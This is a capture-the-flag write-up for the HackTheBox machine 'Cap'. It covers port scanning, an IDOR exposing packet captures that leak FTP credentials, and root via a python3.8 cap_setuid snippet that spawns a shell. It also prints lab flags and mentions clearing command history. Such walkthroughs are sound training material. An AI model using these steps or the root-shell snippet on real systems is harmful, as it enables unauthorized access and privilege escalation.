# HTB: Cap

## Engagement Overview

**Target:** Cap   
**Box IP:** 10.10.10.245  
**Local IP:** 10.10.14.16   
**Date:** 2025-07-21

---

### Objectives

- Discover and exploit an IDOR to access sensitive captures
- Extract credentials from a packet capture (pcap)
- Use leaked credentials to obtain a shell and escalate to root via Linux capabilities

---

## Service Enumeration

```bash
# Full TCP scan (condensed)
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.245
nmap -p 21,22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.245
```

**Relevant outputs / findings:**

- Port 21 – FTP (vsftpd 3.0.3) — no anonymous access
- Port 22 – SSH (OpenSSH 8.2p1)
- Port 80 – HTTP (Gunicorn, Python-based web app)
- Gunicorn dashboard and predictable `/data/<id>` endpoints indicated possible IDOR

---

## Initial Access

### IDOR Discovery & PCAP Extraction

- Accessing `/data/0` returned a packet capture (pcap) not generated by current session — classic IDOR.
- Downloaded pcap and analyzed in Wireshark to recover cleartext credentials:
  - `USER: nathan`
  - `PASS: Buck3tH4TF0RM3!`

### Foothold via FTP/SSH

```bash
ftp 10.10.10.245
# login: nathan / Buck3tH4TF0RM3!
ftp> get user.txt  # user flag retrieved: e64084b4cf1836347593df12f6a16b75
```
- SSH access confirmed using same credentials for `nathan`

---

## Privilege Escalation

### LinPEAS findings

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Because `python3.8` has the `cap_setuid` capability, it can be used to escalate privileges by changing UID to 0 and spawning a shell.

**Exploit (performed on target):**
```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Result:** Root shell obtained. `root.txt` captured: `f0f8a2a1d4bfdea7688e471cf3ad04a4`

---

## House Cleaning / Post-Exploitation

- Removed `linpeas.sh` and cleared command history where appropriate
- No persistent backdoors left

**Flags:**
- `user.txt`: `e64084b4cf1836347593df12f6a16b75`
- `root.txt`: `f0f8a2a1d4bfdea7688e471cf3ad04a4`

---

## Tools Utilized
- nmap, ftp, ssh, python3
- Wireshark
- LinPEAS

---

## Key Takeaways
- IDORs exposing resources like pcaps can leak highly sensitive credentials.
- Linux capabilities (caps) provide alternate privilege escalation routes beyond setuid binaries.
- Packet analysis skills (Wireshark) are critical for extracting cleartext credentials from captures.
